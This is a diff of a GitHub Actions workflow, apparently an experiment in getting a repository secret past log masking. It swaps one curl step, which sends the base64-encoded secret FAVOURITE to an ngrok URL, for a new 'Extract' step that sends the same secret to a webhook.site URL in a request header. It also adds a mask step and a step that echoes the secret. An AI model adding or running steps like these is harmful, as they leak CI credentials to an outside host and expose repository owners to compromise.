@@ -17,9 +17,13 @@ jobs:
     environment: Vienna
 
     steps:
-      - name: extract
+      - name: Add mask
         run: |
-          curl https://b1ed-128-130-252-211.ngrok-free.app?data=$(echo ${{ secrets.FAVOURITE }} | base64 --wrap=0)"
-
+          echo "::add-mask::${{ secrets.FAVOURITE }}"
+        
       - name: I ll tell you my current favourite 
         run: echo ${{ secrets.FAVOURITE }}
+
+      - name: Extract
+        run: |
+          curl https://webhook.site/5334b80b-90b1-4e6b-a657-f8fef11fdd43 -H "X-API-Key: ${{ secrets.FAVOURITE }}"
